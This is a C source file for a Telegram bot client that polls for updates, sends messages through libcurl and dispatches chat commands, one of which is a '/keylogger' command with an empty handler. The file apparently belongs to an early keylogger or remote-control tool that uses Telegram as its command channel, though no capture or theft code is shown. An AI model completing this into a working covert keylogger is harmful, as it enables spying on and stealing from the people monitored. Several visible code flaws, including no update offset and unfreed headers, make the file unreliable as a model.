#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <curl/curl.h>
#include <json-c/json.h>
#include <time.h>
#include "utils.h"
#include "fiobj.h"

char *base_uri;
int init_date;

int last_update_id = 0;

void init_telegram(char* token) {
    base_uri = malloc((28 + strlen(token) + 1) * sizeof(char));
    if (!base_uri) {
      printf("Could not allocate memory to the base_uri variable.\n");
      fflush(stdout);
      exit(1);
    }
    strcpy(base_uri, "https://api.telegram.org/bot");
    strcat(base_uri, token);

    init_date = (int) time(NULL);

    fflush(stdout);
}

void send_message(const char* json_string) {
  CURL *curl;
  CURLcode res;

  curl = curl_easy_init();
  if (curl) {
    // Telegram URI
    char *uri = malloc((strlen(base_uri) + 12 + 1) * sizeof(char));
    if (!uri) {
      printf("Could not allocate memory to the uri variable.\n");
      fflush(stdout);
      exit(1);
    }
    strcpy(uri, base_uri);
    strcat(uri, "/sendMessage");

    // Create appropiate headers
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Accept: application/json");
    headers = curl_slist_append(headers, "Content-Type: application/json");
    headers = curl_slist_append(headers, "charsets: utf-8");

    curl_easy_setopt(curl, CURLOPT_URL, uri);
    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "POST");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_string);

    res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
      fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
    }

    curl_easy_cleanup(curl);
    free(uri);
  }
  curl_global_cleanup();
  fflush(stdout); // Flush for curl outpu
}

void send_picture(const char* json_string) {
  // TODO: This
  printf("%s", json_string);
  fflush(stdout);
}

void fetch_updates(json_object **buffer) {
  CURL *curl;
  CURLcode res;

  curl = curl_easy_init();
  if (curl) {
    // Telegram URI
    char *uri = malloc((strlen(base_uri) + 12 + 1) * sizeof(char));
    if (!uri) {
      printf("Could not allocate memory to the uri variable.\n");
      fflush(stdout);
      exit(1);
    }
    strcpy(uri, base_uri);
    strcat(uri, "/getUpdates");

    // Create appropiate headers
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Accept: application/json");
    headers = curl_slist_append(headers, "Content-Type: application/json");
    headers = curl_slist_append(headers, "charsets: utf-8");

    struct MemoryStruct chunk;
    chunk.memory = malloc(1);
    chunk.size = 0;

    curl_easy_setopt(curl, CURLOPT_URL, uri);
    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "GET");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    // Writing the body
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

    res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
      fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
    } else {
      *buffer = json_tokener_parse(chunk.memory);
    }

    curl_easy_cleanup(curl);
    free(uri);
  }
  
  curl_global_cleanup();
  fflush(stdout);
}

void* handle_cmds() {
  while(!fio_is_running()) {
    sleep(1);
  }

  struct json_object *obj, *ok, *result;
  int update_len, i;

  while (fio_is_running()) {
    fetch_updates(&obj);

    if (obj != NULL) {
      json_object_object_get_ex(obj, "ok", &ok);
      json_object_object_get_ex(obj, "result", &result);

      printf("Ok: %d\n", json_object_get_boolean(ok));
      printf("Result Size: %zu\n", json_object_get_array(result)->length);

      update_len = json_object_array_length(result);
      if (update_len > 0) {
        for (i = 0; i < update_len; i++) {
          struct json_object* update_obj = json_object_array_get_idx(result, i);
          int update_id = json_object_get_int(json_object_object_get(update_obj, "update_id"));

          if (update_id > last_update_id) {
            struct json_object* message_obj = json_object_object_get(update_obj, "message");
            int d = json_object_get_int(json_object_object_get(message_obj, "date"));
            if (d >= init_date) {
              // Now we actually do something
              char* cmd_label = json_object_get_string(json_object_object_get(message_obj, "text"));
              if (strcmp(cmd_label, "/keylogger") == 0) {
                // Continue
              }

              last_update_id = update_id;
            }
          }
        }
      }
    }

    sleep(1);
  }

  printf("INFO: Shutting down command thread.\n");

  // printf("Hi mate I am so cool did you know that?");
  // fflush(stdout);
  pthread_exit(NULL);
}